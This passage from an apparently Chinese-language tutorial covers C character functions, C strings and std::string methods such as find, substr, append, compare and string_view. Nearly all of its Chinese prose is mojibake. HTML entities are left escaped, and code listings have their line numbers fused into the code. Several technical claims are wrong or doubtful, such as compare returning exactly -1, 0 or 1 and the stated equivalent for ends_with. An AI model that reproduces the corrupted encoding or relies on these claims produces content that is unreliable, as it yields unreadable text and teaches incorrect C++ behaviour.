&amp;&amp; c &lt;= â€˜Zâ€™ï¼‰ã€‚ islower(c) åˆ¤æ–­æ˜¯å¦ä¸ºå°å†™å­—æ¯ï¼ˆâ€˜aâ€™ &lt;= c &amp;&amp; c &lt;= â€˜zâ€™ï¼‰ã€‚ isalpha(c) åˆ¤æ–­æ˜¯å¦ä¸ºå­—æ¯ï¼ˆåŒ…æ‹¬å¤§å†™å’Œå°å†™ï¼‰ã€‚ isdigit(c) åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ï¼ˆâ€˜0â€™ &lt;= c &amp;&amp; c &lt;= â€˜9â€™ï¼‰ã€‚ isalnum(c) åˆ¤æ–­æ˜¯å¦ä¸ºå­—æ¯æˆ–æ•°å­—ï¼ˆåŒ…æ‹¬å­—æ¯å’Œæ•°å­—ï¼‰ã€‚ isxdigit(c) åˆ¤æ–­æ˜¯å¦ä¸ºåå…­è¿›åˆ¶æ•°å­—ï¼ˆ0~9 æˆ– a-f æˆ– A-Fï¼‰ã€‚ isspace(c) åˆ¤æ–­æ˜¯å¦ä¸ºç­‰ä»·äºç©ºæ ¼çš„å­—ç¬¦ï¼ˆâ€˜ â€™ æˆ– â€˜ æˆ– â€˜â€™ æˆ– â€˜ æˆ– â€˜ï¼‰ã€‚ iscntrl(c) åˆ¤æ–­æ˜¯å¦ä¸ºæ§åˆ¶å­—ç¬¦ï¼ˆ0 &lt;= c &amp;&amp; c &lt;= 31 æˆ– c == 127ï¼‰ã€‚ toupper(c) æŠŠå°å†™å­—æ¯è½¬æ¢ä¸ºå¤§å†™å­—æ¯ï¼Œå¦‚æœä¸æ˜¯åˆ™åŸå°ä¸åŠ¨è¿”å›ã€‚ tolower(c) æŠŠå¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™å­—æ¯ï¼Œå¦‚æœä¸æ˜¯åˆ™åŸå°ä¸åŠ¨è¿”å›ã€‚ char ç±»å‹åªéœ€æ˜¯ 8 ä½å³å¯ï¼Œå¯ä»¥æ˜¯æœ‰ç¬¦å·ä¹Ÿå¯ä»¥æ˜¯æ— ç¬¦å·ï¼Œä»»å‡­ç¼–è¯‘å™¨å†³å®šã€‚åœ¨ x86 æ¶æ„æ˜¯æœ‰ç¬¦å·çš„ (char = signed char)ï¼Œè€Œåœ¨ arm æ¶æ„ä¸Šåˆ™è®¤ä¸ºæ˜¯æ— ç¬¦å·çš„ (char = unsigned char)ã€‚ ä½†æ˜¯C è¯­è¨€å´è§„å®š shortï¼Œintï¼Œlongï¼Œlong long å¿…é¡»æ˜¯æœ‰ç¬¦å·çš„ (int = signed int)ï¼Œåè€Œå´æ²¡æœ‰è§„å®šä»–ä»¬çš„ä½å®½ï¼Œå’Œ char åˆšå¥½ç›¸åã€‚ C++ æ ‡å‡†ä¿è¯ charï¼Œsigned charï¼Œunsigned char æ˜¯ä¸‰ä¸ªå®Œå…¨ä¸åŒçš„ç±»å‹ï¼Œstd::is_same_v åˆ†åˆ«åˆ¤æ–­ä»–ä»¬æ€»ä¼šå¾—åˆ° falseï¼Œæ— è®º x86 è¿˜æ˜¯ armã€‚ 123456789// åˆ¤æ–­ç³»ç»Ÿint main(int argc, char *argv[]) &#123; if (std::is_signed&lt;char&gt;::value) &#123; printf(\"signed, x86\"); &#125; else &#123; printf(\"unsigned, arm:\"); &#125; return 0;&#125; C string å­—ç¬¦ä¸²(string)å°±æ˜¯ç”±å­—ç¬¦(character)ç»„æˆçš„æ•°ç»„ã€‚ 123char c = â€˜hâ€™; // â€˜hâ€™ æ˜¯ä¸ªè¯­æ³•ç³–ï¼Œç­‰ä»·äº 104 ASCIIç // â€œhelloâ€ ä¹Ÿæ˜¯ä¸ªè¯­æ³•ç³–ï¼Œç­‰ä»·äºæ•°ç»„ &#123;â€˜hâ€™, â€˜eâ€™, â€˜lâ€™, â€˜lâ€™, â€˜oâ€™, 0&#125;char s[] = â€œhelloâ€; C è¯­è¨€çš„å­—ç¬¦ä¸²å› ä¸ºåªä¿ç•™æ•°ç»„çš„é¦–åœ°å€æŒ‡é’ˆï¼ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå­—ç¬¦çš„æŒ‡é’ˆï¼‰ï¼Œåœ¨ä»¥ char * ç±»å‹ä¼ é€’ç»™å…¶ä»–å‡½æ•°æ—¶ï¼Œå…¶æ•°ç»„çš„é•¿åº¦æ— æ³•çŸ¥æ™“ã€‚ ä¸ºäº†ç¡®åˆ‡çŸ¥é“æ•°ç»„åœ¨ä»€ä¹ˆåœ°æ–¹ç»“æŸï¼Œè§„å®šç”¨ ASCII ç ä¸­çš„â€œç©ºå­—ç¬¦â€ä¹Ÿå°±æ˜¯ 0 æ¥è¡¨ç¤ºæ•°ç»„çš„ç»“å°¾ã€‚è¿™æ ·åªéœ€è¦ä¸€ä¸ªé¦–åœ°å€æŒ‡é’ˆå°±èƒ½è¡¨ç¤ºä¸€ä¸ªåŠ¨æ€é•¿åº¦çš„æ•°ç»„ã€‚ é™¤äº† \\0 ï¼Œå…¶ä»–å¸¸è§è½¬ä¹‰ç¬¦å·ï¼š â€˜â€™ æ¢è¡Œç¬¦ï¼šå¦èµ·ä¸€è¡Œï¼ˆå…‰æ ‡ç§»åˆ°ä¸‹ä¸€è¡Œè¡Œé¦–ï¼‰ â€˜ å›è½¦ç¬¦ï¼šå…‰æ ‡ç§»åˆ°è¡Œé¦–ï¼ˆè¦†ç›–åŸæ¥çš„å­—ç¬¦ï¼‰ â€˜ ç¼©è¿›ç¬¦ï¼šå…‰æ ‡æ¨ªåæ ‡å¯¹é½åˆ° 8 çš„æ•´æ•°å€ â€˜ é€€æ ¼ç¬¦ï¼šå…‰æ ‡å·¦ç§»ï¼Œåˆ é™¤ä¸Šä¸ªå­—ç¬¦ â€˜\\â€™ åæ–œæ ï¼šè¡¨ç¤ºè¿™ä¸ªæ˜¯çœŸçš„ ï¼Œä¸æ˜¯è½¬ä¹‰ç¬¦ â€˜â€â€™ åŒå¼•å·ï¼šåœ¨å­—ç¬¦ä¸²å¸¸é‡ä¸­ä½¿ç”¨ï¼Œé˜²æ­¢æ­§ä¹‰ â€˜â€™â€™ å•å¼•å·ï¼šåœ¨å­—ç¬¦å¸¸é‡ä¸­ä½¿ç”¨ï¼Œé˜²æ­¢æ­§ä¹‰ â€˜\\0â€™ ç©ºå­—ç¬¦ï¼šæ ‡è®°å­—ç¬¦ä¸²ç»“å°¾ï¼Œç­‰ä»·äº 0ï¼Œæ³¨æ„å’Œ '0' ä¸ç­‰ä»·ã€‚ C++ å­—ç¬¦ä¸² ä½¿ç”¨C++çš„ç‰¹æ€§ï¼Œç®€åŒ–å¯¹å­—ç¬¦ä¸²æ•°æ®çš„å¤„ç†æ–¹å¼ã€‚å…¶ç‰¹ç‚¹æœ‰ï¼š string å¯ä»¥ä» const char * éšå¼æ„é€ ï¼šstring s = â€œhelloâ€; string å…·æœ‰ +ã€+=ã€== ç­‰ç›´è§‚çš„è¿ç®—ç¬¦é‡è½½ï¼šstring(â€œhelloâ€) + string(â€œworldâ€) == string(â€œhelloworldâ€) string ç¬¦åˆ vector çš„æ¥å£ï¼Œä¾‹å¦‚ begin/end/size/resizeâ€¦â€¦ string æœ‰ä¸€ç³»åˆ—æˆå‘˜å‡½æ•°ï¼Œä¾‹å¦‚ find/replace/substrâ€¦â€¦ string å¯ä»¥é€šè¿‡ s.c_str() é‡æ–°è½¬æ¢å›å¤æ¿çš„ const char *ã€‚ string åœ¨ç¦»å¼€ä½œç”¨åŸŸæ—¶è‡ªåŠ¨é‡Šæ”¾å†…å­˜ (RAII)ï¼Œä¸ç”¨æ‰‹åŠ¨ freeã€‚ C è¯­è¨€å­—ç¬¦ä¸²æ˜¯å•ç‹¬ä¸€ä¸ª char *ptrï¼Œè‡ªåŠ¨ä»¥ â€˜\\0â€™ ç»“å°¾ã€‚C++ å­—ç¬¦ä¸²æ˜¯ string ç±»ï¼Œå…¶æˆå‘˜æœ‰ä¸¤ä¸ªï¼š char *ptr; size_t len; æœ‰äº†lenï¼Œå°±ä¸éœ€è¦ â€˜\\0â€™ æ ‡è®°ç»“å°¾ã€‚ string ç±»ä» C å­—ç¬¦ä¸²æ„é€ æ—¶ï¼Œå¯ä»¥é¢å¤–æŒ‡å®šä¸€ä¸ªé•¿åº¦ï¼Œstring(â€œhelloâ€, 3) ä¼šå¾—åˆ° â€œhelâ€ã€‚len è¶…å‡ºèŒƒå›´ä¼šå‡ºç°è¶Šç•Œè¯»å–å†…å­˜çš„é”™è¯¯ã€‚ c_str() å’Œ data() s.c_str() ä¿è¯è¿”å›çš„æ˜¯ä»¥ 0 ç»“å°¾çš„å­—ç¬¦ä¸²é¦–åœ°å€æŒ‡é’ˆï¼Œæ€»é•¿åº¦ä¸º s.size() + 1ã€‚ s.data() åªä¿è¯è¿”å›é•¿åº¦ä¸º s.size() çš„è¿ç»­å†…å­˜çš„é¦–åœ°å€æŒ‡é’ˆï¼Œä¸ä¿è¯ 0 ç»“å°¾ã€‚ æŠŠ C++ çš„ string ä½œä¸ºå‚æ•°ä¼ å…¥åƒ printf è¿™ç§ C è¯­è¨€å‡½æ•°æ—¶ï¼Œéœ€è¦ç”¨ s.c_str()ã€‚å¦‚æœåªæ˜¯åœ¨ C++ å‡½æ•°ä¹‹é—´ä¼ å‚æ•°ï¼Œç›´æ¥ç”¨ string æˆ– string const &amp; å³å¯ã€‚è€ƒè™‘ä¼ å‚æ•ˆç‡ï¼Œå¯ä»¥ä½¿ç”¨ string_viewã€‚ 1234void legacy_c(const char *name); // å¤è€çš„ C è¯­è¨€é—äº§void modern_cpp(std::string name); // è¿™ä¸ªå‡½æ•°æ˜¯ç°ä»£ C++void performance_geek(std::string const &amp;name); // è¿½æ±‚æ€§èƒ½void performance_nerd(std::string_view name); // è¶…çº§è¿½æ±‚æ€§èƒ½ è‡ªå®šä¹‰å­—é¢é‡åç¼€ 123456789string operator\"\"_s(const char *s, size_t len) &#123; return string(s, len);&#125;int main() &#123; // ä½¿ç”¨ string s3 = \"hello\"_s + \"world\"_s; cout &lt;&lt; s3 &lt;&lt; endl;&#125; å†™ â€œhelloâ€_s å°±ç›¸å½“äºå†™ operatorâ€œâ€_s(â€œhelloâ€, 5)ï¼Œå°±ç›¸å½“äº string(â€œhelloâ€, 5) äº†ã€‚ å¦‚æœä½  using namespace std; é‚£ä¹ˆæ ‡å‡†åº“å·²ç»è‡ªåŠ¨å¸®ä½ å®šä¹‰å¥½äº† â€œâ€s åç¼€ã€‚è¿™é‡Œ â€œhelloâ€s å°±ç­‰ä»·äºåŸæœ¬ç¹ççš„ string(â€œhelloâ€) äº†ã€‚æˆ–è€…æ›´å®‰å…¨ä¸€ç‚¹ using namespace std::literials; std::to_string() std::to_string æ˜¯æ ‡å‡†åº“å®šä¹‰çš„å…¨å±€å‡½æ•°ï¼Œä»–å…·æœ‰9ä¸ªé‡è½½ï¼Œå°†æ•°å­—è½¬ä¸ºå­—ç¬¦ä¸²ã€‚ æŠŠ to_string ä½œä¸ºå…¨å±€å‡½æ•°ï¼Œè€Œä¸æ˜¯ string ç±»çš„æ„é€ å‡½æ•°ï¼Œå¯ä»¥è®©æ•°å­—è½¬å­—ç¬¦ä¸²è¿™ä¸ªç‰¹å®šçš„éœ€æ±‚ï¼Œå’Œå­—ç¬¦ä¸²æœ¬èº«çš„å®ç°ä¸ä¼šæœ‰å¤ªå¤šè€¦åˆã€‚ ç›¸å…³å‡½æ•°ï¼Œå­—ç¬¦ä¸²è½¬æ•°å­—ï¼šstd::stoi/stof/stod æ˜¯æ ‡å‡†åº“å®šä¹‰çš„ä¸€ç³»åˆ—å…¨å±€å‡½æ•°ã€‚ stoi æœ‰ç¬¬äºŒå‚æ•° &amp;posï¼Œç”¨æ¥ä¿å­˜æ•°å­—éƒ¨åˆ†ç»“æŸçš„é‚£ä¸ªå­—ç¬¦åœ¨åŸå­—ç¬¦ä¸²ä¸­æ‰€åœ¨çš„indexã€‚ stoi çš„ç¬¬ä¸‰å‚æ•° base è¡¨ç¤ºï¼Œå½“å‰å­—ç¬¦ä¸²è¡¨ç¤ºçš„æ•°å­—çš„è¿›åˆ¶ã€‚ å¦å¤– stof æ”¯æŒç§‘å­¦è®¡æ•°æ³•ã€‚ stringstream æƒ³è¦å®Œæ•´å­—ç¬¦ä¸²æ ¼å¼åŒ–åŠŸèƒ½ï¼ˆæŒ‡å®šå¤šå°‘è¿›åˆ¶ï¼Œå·¦å³å¯¹é½ç­‰ï¼‰ï¼Œå¯ä»¥ç”¨ä¸“ä¸šçš„åšæ³•ï¼š C è¯­è¨€çš„ sprintf C++ çš„ stringstream C++20 æ–°å¢çš„ std::format stringstream æ˜¯ç›¸å¯¹è¾ƒæ—©çš„å¤„ç†æ–¹æ³•ï¼Œæ¯”å¦‚è®¾ç½®æ•°å­—è¿›åˆ¶ï¼š 1234567891011#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;iomanip&gt;int main() &#123; stringstream ss; ss &lt;&lt; hex &lt;&lt; 66; string s = ss.str(); std::cout &lt;&lt; s &lt;&lt; std::endl; // åªæ˜¯ä¸ºäº†æ˜¾ç¤ºç»“æœ&#125; å®˜æ–¹æ¨èç”¨ stringstream å–ä»£ to_stringã€‚stringstream ä¹Ÿå¯ä»¥å–ä»£ stoiã€‚ 123456789101112131415#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;iomanip&gt;int main() &#123; string s = \"233word\"; stringstream ss(s); int num; ss &gt;&gt; num; string unit; ss &gt;&gt; unit; std::cout &lt;&lt; num &lt;&lt; \" \" &lt;&lt; unit &lt;&lt; std::endl;&#125; at() s.at(i) å’Œ s[i] éƒ½å¯ä»¥è·å–å­—ç¬¦ä¸²ä¸­çš„ç¬¬ i ä¸ªå­—ç¬¦ã€‚åŒºåˆ«åœ¨äº at å¦‚æœé‡åˆ° i è¶Šç•Œçš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯æ£€æµ‹åˆ° i â‰¥ s.size() æ—¶ï¼Œä¼šæŠ›å‡º std::out_of_range å¼‚å¸¸ç»ˆæ­¢ç¨‹åºã€‚at åšè¶Šç•Œæ£€æµ‹éœ€è¦é¢å¤–çš„å¼€é”€ï¼Œ[] ä¸éœ€è¦ã€‚ å…¶ä»–æ–¹æ³• s.length() å’Œ s.size() è·å–å­—ç¬¦ä¸²é•¿åº¦æœ‰ä¸¤ç§å†™æ³• s.length() å’Œ s.size() ç­‰ä»·ã€‚ substr() å‡½æ•°åŸå‹ä¸ºï¼š 1string substr(size_t pos = 0, size_t len = -1) const; substr(pos, len) ä¼šæˆªå–ä»ç¬¬ pos ä¸ªå­—ç¬¦å¼€å§‹ï¼Œé•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²ï¼ŒåŸå­—ç¬¦ä¸²ä¸ä¼šæ”¹å˜ã€‚ å¦‚æœ pos è¶…å‡ºäº†åŸå­—ç¬¦ä¸²çš„èŒƒå›´ï¼Œåˆ™æŠ›å‡º std::out_of_range å¼‚å¸¸ã€‚ å¯ä»¥æŒ‡å®š len ä¸º -1ï¼ˆå³ string::nposï¼‰ï¼Œæ­¤æ—¶ä¼šæˆªå–ä» pos å¼€å§‹ç›´åˆ°åŸå­—ç¬¦ä¸²æœ«å°¾çš„å­å­—ç¬¦ä¸²ã€‚ lenä¸ºä»€ä¹ˆå¯ä»¥æ˜¯ -1 ï¼Ÿå› ä¸º -1 ç±»å‹è½¬ä¸ºæ— ç¬¦å· size_t ç±»å‹ä¹‹åï¼Œæ˜¯å¾ˆå¤§çš„æ•°ï¼Œ0xffffffffffffffffã€‚ find() find æ‹¥æœ‰ä¼—å¤šé‡è½½ï¼Œè¿”å›è¿™ä¸ªå­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°æ‰€åœ¨çš„ä½ç½®ã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¿”å› -1ã€‚ 12345size_t find(char c, size_t pos = 0) const noexcept;size_t find(string_view svt, size_t pos = 0) const noexcept;size_t find(string const &amp;str, size_t pos = 0) const noexcept;size_t find(const char *s, size_t pos = 0) const;size_t find(const char *s, size_t pos, size_t count) const; ä¸ºä»€ä¹ˆæœ€åä¸¤ä¸ªé‡è½½æ²¡æœ‰æ ‡è®° noexceptï¼Ÿåªæ˜¯å†å²åŸå› ã€‚ å®é™…ä¸Š find å‡½æ•°éƒ½æ˜¯ä¸ä¼šæŠ›å‡ºå¼‚å¸¸çš„ï¼Œä»–æ‰¾ä¸åˆ°åªä¼šè¿”å› -1ã€‚å¯ä»¥ç”¨ std::string::npos ä»£æ›¿ -1ã€‚ 12345// éƒ½æ˜¯ç­‰ä»·çš„s.find(c) != string::nposs.find(c) != s.nposs.find(c) != (size_t)-1s.find(c) != -1 ä¸‹é¢æ˜¯ std::string::npos çš„å®šä¹‰ã€‚ 1static const size_type npos = static_cast&lt;size_type&gt;(-1); find(â€œstrâ€, pos) æ˜¯ä»ç¬¬ pos ä¸ªå­—ç¬¦å¼€å§‹æŸ¥æ‰¾å­å­—ç¬¦ä¸² â€œstrâ€ã€‚ è¿˜æœ‰ find(â€œstrâ€, pos, len) å’Œ find(â€œstrâ€.substr(0, len), pos) ç­‰ä»·ï¼Œç”¨äºæŸ¥è¯¢ç¡®å®šé•¿åº¦å­—ç¬¦ä¸²ï¼Œæˆ–è€…è¦æŸ¥è¯¢çš„å­—ç¬¦ä¸²æ˜¯ä¸ªåˆ‡ç‰‡ï¼ˆstring_viewï¼‰çš„æƒ…å†µã€‚ è‹¥ä¸æŒ‡å®šè¿™ä¸ªé•¿åº¦ lenï¼Œåˆ™é»˜è®¤æ˜¯ C è¯­è¨€çš„ 0 ç»“å°¾å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶ find è¿˜è¦å»æ±‚ len = strlen(â€œstrâ€)ï¼Œç›¸å¯¹ä½æ•ˆã€‚ rfind åˆ™æ˜¯ä»å°¾éƒ¨å¼€å§‹æŸ¥æ‰¾ï¼Œè¿”å›æœ€åä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ã€‚ find_first_of() 123size_t find_first_of(string const &amp;s, size_t pos = 0) const noexcept;size_t find_first_of(const char *s, size_t pos = 0) const noexcept;size_t find_first_of(const char *s, size_t pos, size_t n) const noexcept; â€œstrâ€.find_first_of(â€œchsetâ€, pos) ä¼šä»ç¬¬ pos ä¸ªå­—ç¬¦å¼€å§‹ï¼Œåœ¨ â€œstrâ€ ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªå‡ºç°çš„ â€˜câ€™ æˆ– â€˜hâ€™ æˆ– â€˜sâ€™ æˆ– â€˜eâ€™ æˆ– â€˜tâ€™ å­—ç¬¦ï¼Œå¹¶è¿”å›ä»–æ‰€åœ¨çš„ä½ç½®ã€‚å¦‚æœéƒ½æ‰¾ä¸åˆ°ï¼Œåˆ™ä¼šè¿”å› -1ï¼ˆstring::nposï¼‰ã€‚ å…¶å® s.find_first_of(â€œchsetâ€) ç­‰ä»·äº min(s.find(â€˜câ€™), s.find(â€˜hâ€™), s.find(â€˜sâ€™), s.find(â€˜eâ€™), s.find(â€˜tâ€™))ã€‚ æŒ‰ç©ºæ ¼åˆ†å‰²å­—ç¬¦ä¸²å°±å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼šs.find_first_of(â€œ )ã€‚ç©ºæ ¼ç±»å­—ç¬¦æ˜¯ä¸€ä¸ªé›†åˆ {â€˜ â€™, â€˜, â€˜, â€˜, â€˜â€™, â€˜}ã€‚ 1234567891011121314vector&lt;string&gt; split(string s) &#123; vector&lt;string&gt; ret; size_t pos = 0; while (true) &#123; size_t newpos = s.find_first_of(\" \\t\\v\\f\\n\\r\", pos); if (newpos == s.npos) &#123; ret.push_back(s.substr(pos, newpos)); break; &#125; ret.push_back(s.substr(pos, newpos - pos)); pos = newpos + 1; &#125; return ret;&#125; åŒæ—¶ä¹Ÿæœ‰find_first_not_of æ–¹æ³•å¯»æ‰¾ä¸åœ¨é›†åˆå†…çš„å­—ç¬¦ã€‚ replace() replace() æ›¿æ¢ä¸€æ®µå­å­—ç¬¦ä¸²ã€‚replace(pos, len, â€œstrâ€) ä¼šæŠŠä» pos å¼€å§‹çš„ len ä¸ªå­—ç¬¦æ›¿æ¢ä¸º â€œstrâ€ã€‚ string çš„æœ¬è´¨å’Œ vector ä¸€æ ·ï¼Œæ˜¯å†…å­˜ä¸­è¿ç»­çš„æ•°ç»„ã€‚æ‰€ä»¥å½“ str é•¿åº¦ä¸ç­‰äº lenï¼Œå°±ä¼šå‘ç”Ÿæ•°æ®çš„å¤åˆ¶ç§»åŠ¨ï¼Œä»è€Œå˜æˆ O(n) æ—¶é—´å¤æ‚åº¦ï¼Œä¸¢å¤±æ€§èƒ½ã€‚ append() s.append(â€œworldâ€) å’Œ s += â€œworldâ€ ç­‰ä»·ã€‚åŒºåˆ«åœ¨äº append è¿˜å¯ä»¥æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ï¼Œé™å®šå­—ç¬¦ä¸²é•¿åº¦ï¼Œç”¨äºè¦è¿½åŠ çš„å­—ç¬¦ä¸²å·²ç»ç¡®å®šé•¿åº¦ï¼Œæˆ–è€…æ˜¯ä¸ªåˆ‡ç‰‡çš„æƒ…å†µï¼ˆstring_viewï¼‰ã€‚ ä¾‹å¦‚ s.append(â€œworldâ€, 3) å’Œ s += string(â€œworldâ€, 3) å’Œ s += â€œworâ€ ç­‰ä»·ã€‚ 123456string &amp;append(string const &amp;str); // str æ˜¯ C++ å­—ç¬¦ä¸²ç±» string çš„å¯¹è±¡string &amp;append(const char *s); // s æ˜¯é•¿åº¦ä¸º strlen(s) çš„ 0 ç»“å°¾å­—ç¬¦ä¸²string &amp;append(string const &amp;str, size_t len); // åªä¿ç•™å str.size() - len ä¸ªå­—ç¬¦string &amp;append(const char *s, size_t len); // åªä¿ç•™å‰ len ä¸ªå­—ç¬¦// æ³¨æ„ç¬¬ä¸‰ä¸ªé‡è½½å‡½æ•°ï¼Œæ˜¯ä¿ç•™ str çš„å str.size() - len ä¸ªå­—ç¬¦ å‰é¢ä¸¤ä¸ªæ˜¯æœ€å¸¸ç”¨çš„ç‰ˆæœ¬ï¼Œå’Œ += ä¹Ÿæ˜¯ç­‰ä»·çš„ã€‚åé¢ä¸¤ä¸ªå¸¦ len çš„ç‰ˆæœ¬å¾ˆå¥‡æ€ªï¼Œä»–ä»¬å±…ç„¶ä¸ä¸€æ ·ï¼šå¯¹äº str æ˜¯ string ç±»å‹æ—¶ï¼Œä¼šå˜æˆä¿ç•™ååŠéƒ¨åˆ†ã€‚å¯¹äº str æ˜¯ const char * ç±»å‹æ—¶ï¼Œä¼šä¿ç•™å‰åŠéƒ¨åˆ†ã€‚ C++17 ä¸­æœ‰æ›´ä¸ºç›´è§‚çš„ string_viewï¼Œè¦åˆ‡ç‰‡åªéœ€ substrï¼Œä¾‹å¦‚ï¼š 123456789// string_view(â€œworldâ€) ä¹Ÿå¯ä»¥ç®€å†™ä½œ â€œworldâ€svs.append(â€œworldâ€, 3) // æ”¹æˆs += string_view(â€œworldâ€).substr(0, 3)s.append(â€œworldâ€s, 3) // æ”¹æˆ s += string_view(â€œworldâ€).substr(3) åˆé«˜æ•ˆï¼Œåˆç›´è§‚æ˜“æ‡‚ï¼Œä¸” substr é™„å¸¦äº†è‡ªåŠ¨æ£€æŸ¥è¶Šç•Œçš„èƒ½åŠ›ï¼Œå®‰å…¨ã€‚ string_view(â€œworldâ€) ä¹Ÿå¯ä»¥ç®€å†™ä½œ â€œworldâ€svã€‚ insert() s.insert(pos, str) ä¼šæŠŠå­å­—ç¬¦ä¸² pos æ’å…¥åˆ°åŸå­—ç¬¦ä¸²ä¸­ç¬¬ pos ä¸ªå­—ç¬¦å’Œç¬¬ pos+1 ä¸ªå­—ç¬¦ä¹‹é—´ã€‚å‡½æ•°åŸå‹ï¼š 1234string &amp;insert(size_t pos, string const &amp;str); // str æ˜¯ C++ å­—ç¬¦ä¸²ç±» string çš„å¯¹è±¡string &amp;insert(size_t pos, const char *s); // s æ˜¯é•¿åº¦ä¸º strlen(s) çš„ 0 ç»“å°¾å­—ç¬¦ä¸²string &amp;insert(size_t pos, string const &amp;str, size_t len); // åªä¿ç•™ str å str.size() - len ä¸ªå­—ç¬¦string &amp;insert(size_t pos, const char *s, size_t len); // åªä¿ç•™ s å‰ len ä¸ªå­—ç¬¦ compare() C è¯­è¨€çš„ strcmp(a, b) ä¸ä»…å¯ä»¥åˆ¤æ–­ç›¸ç­‰ï¼Œä¹Ÿå¯ä»¥ç”¨äºå­—å…¸åºæ¯”è¾ƒï¼Œè¿”å› -1 ä»£è¡¨ a &lt; bï¼Œè¿”å› 1 ä»£è¡¨ a &gt; bï¼Œè¿”å› 0 ä»£è¡¨ a == bã€‚ string ä¹Ÿæœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•° compareï¼Œä»–ä¹Ÿæ˜¯è¿”å› -1ã€1ã€0 è¡¨ç¤ºå¤§å°å…³ç³»ã€‚ a == b å’Œ !a.compare(b) ç­‰ä»·ã€‚ [Not found] starts_with å’Œ ends_with ä»¥ä¸‹å†…å®¹æ²¡æœ‰æ‰¾åˆ°ï¼Œæˆç–‘ï¼š s.starts_with(str) ç­‰ä»·äº s.substr(0, str.size()) == str s.ends_with(str) ç­‰ä»·äº s.substr(str.size()) == str ä»–ä»¬ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œåªä¼šè¿”å› true æˆ– falseï¼Œè¡¨ç¤º s æ˜¯å¦ä»¥ str å¼€å¤´ã€‚ å’Œ vector ç±»ä¼¼çš„å…¶ä»–æ¥å£æ–¹æ³• at, [], data, size, resize, empty, clear, capacity, reserve, shrink_to_fit, insert, erase, assign, push_back, pop_back, front, back, begin, end, rbegin, rend, swap, move string åœ¨è¿™äº›å‡½æ•°ä¸Šéƒ½å’Œ vector&lt;char&gt; ä¸€æ ·ã€‚ basic_string string è¢« c++filt è§£æä¸º basic_string&lt;char, char_traits&lt;char&gt;, allocator&lt;char&gt;&gt;ã€‚std::string å°±æ˜¯ä»–çš„ç±»å‹åˆ«åï¼ˆtypedefï¼‰ã€‚ string_view ä¹Ÿæ˜¯ basic_string_view&lt;char, char_traits&lt;char&gt;&gt; çš„ç±»å‹åˆ«åã€‚ å¯è‡ªå®šä¹‰ char_traits ï¼Œä½¿ç”¨æ¯”æ ‡å‡†åº“æ›´é«˜æ•ˆçš„å­—ç¬¦ä¸²æ¯”è¾ƒã€èµ‹å€¼ç­‰æ–¹æ³•ã€‚æˆ–è€… allocator è‡ªå®šä¹‰å†…å­˜ç®¡ç†ã€‚ string ç©ºåŸºç±»ä¼˜åŒ– [ TODO ] string ç±»ä¸­ï¼Œå°†é¦–åœ°å€æŒ‡é’ˆæˆå‘˜å±æ€§åŒ…è£…åœ¨ä¸€ä¸ªç»§æ‰¿äº†ç©ºåŸºç±» allocator_type çš„ç±» _Alloc_hider ä¸­ã€‚ å› ä¸ºï¼Œå¦‚æœåªæ˜¯æŠŠ allocatorï¼ˆç©ºçš„ï¼‰ç›´æ¥ä½œä¸ºæˆå‘˜å˜é‡æ”¾åœ¨ basic_string é‡Œçš„ï¼Œè‡³å°‘è¦å 1ä¸ªå­—èŠ‚ï¼Œå†è€ƒè™‘å­—èŠ‚å¯¹é½ã€‚æ¯”å¦‚ï¼Œè¿™1ä¸ªå­—èŠ‚æ‰©å±•åˆ° 8 ä¸ªå­—èŠ‚ã€‚è€Œè¿™ 8 å­—èŠ‚æ²¡æœ‰ä»»ä½•æ•°æ®ï¼Œåªæ˜¯æµªè´¹ç©ºé—´ã€‚ å¦‚æœä¸€ä¸ªç±»ï¼ˆ_Alloc_hiderï¼‰çš„åŸºç±»æ˜¯ç©ºç±»ï¼ˆallocatorï¼‰ï¼Œåˆ™è¿™ä¸ªåŸºç±»ä¸å æ®ä»»ä½•ç©ºé—´ï¼Œå¦‚æœè¿™ä¸ªæ´¾ç”Ÿç±»ï¼ˆ_Alloc_hiderï¼‰å¦‚æœå®šä¹‰äº†å¤§å°ä¸º n å­—èŠ‚çš„æˆå‘˜å˜é‡ï¼ˆ_M_pï¼‰ï¼Œåˆ™è¿™ä¸ªæ´¾ç”Ÿç±»ï¼ˆ_Alloc_hiderï¼‰çš„å¤§å°ä¹Ÿæ˜¯ nã€‚ _M_allocator ä»åŸæ¥è¢«è¿«ä»1å­—èŠ‚å¼€å§‹å¯¹é½ï¼Œåˆ°ä¸å ç©ºé—´ã€‚ å­—ç¬¦ä¸²èƒ–æŒ‡é’ˆ è¦æè¿°ä¸€ä¸ªåŠ¨æ€é•¿åº¦çš„æ•°ç»„ï¼ˆæ­¤å¤„ä¸ºå­—ç¬¦ä¸²ï¼‰ï¼Œéœ€è¦é¦–åœ°å€æŒ‡é’ˆå’Œæ•°ç»„é•¿åº¦ä¸¤ä¸ªå‚æ•°ã€‚C è¯­è¨€å‡å®šå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ä¸å¯èƒ½å‡ºç° â€˜\\0â€™ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ â€˜\\0â€™ ä½œä¸ºç»“å°¾çš„æ ‡è®°ç¬¦ã€‚ å¯ä»¥æŠŠè¿™æè¿°åŒä¸€ä¸ªä¸œè¥¿çš„ä¸¤ä¸ªå‚æ•°é¦–åœ°å€æŒ‡é’ˆå’Œæ•°ç»„é•¿åº¦ï¼Œæ‰“åŒ…è¿›ä¸€ä¸ªç»“æ„ä½“ï¼ˆstructï¼‰é‡Œï¼š 1234struct FatPtr &#123; char *ptr; size_t len;&#125;; è¿™å°±æ˜¯ rust 